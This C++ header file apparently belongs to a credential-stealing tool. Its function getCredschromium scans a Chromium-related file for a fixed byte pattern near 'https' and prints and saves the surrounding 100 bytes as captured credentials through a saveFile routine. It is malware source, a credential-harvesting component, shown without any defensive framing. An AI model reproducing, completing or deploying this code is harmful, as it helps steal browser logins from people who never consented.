#pragma once
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <sstream>
#include "../core/saveFile.h"

int getCredschromium(std::string filename) {
    std::ifstream file(filename, std::ios::binary);

    if (!file.is_open()) {
        std::cerr << "Error opening the file." << std::endl;
        return 1;
    }

    // Specify your search pattern here
    std::vector<unsigned char> searchPattern = { 0x20, 0x2D, 0x20, 0x68, 0x74, 0x74, 0x70, 0x73, 0x20, 0x77, 0x00 };

    // Initialize variables to count consecutive spaces
    int consecutiveSpaces = 0;

    while (!file.eof()) {
        unsigned char c;
        file.read(reinterpret_cast<char*>(&c), sizeof(c));

        // Check if the character matches the search pattern
        if (c == searchPattern[consecutiveSpaces]) {
            consecutiveSpaces++;

            if (consecutiveSpaces == searchPattern.size()) {
                // Pattern found, rewind to collect the 100 characters before the pattern
                std::vector<unsigned char> buffer(100, 0);

                file.seekg(-static_cast<int>(buffer.size()), std::ios::cur);
                file.read(reinterpret_cast<char*>(buffer.data()), buffer.size());

                // Convert the buffer to a UTF-8 string
                std::string utf8Data(buffer.begin(), buffer.end());

                // Print the UTF-8 string
                std::cout << "Pattern Data: " + utf8Data << std::endl;

                //Save into file
                saveFile(utf8Data);

                consecutiveSpaces = 0;
            }
        }
        else {
            consecutiveSpaces = 0;
        }
    }

    file.close();
    return 0;
}
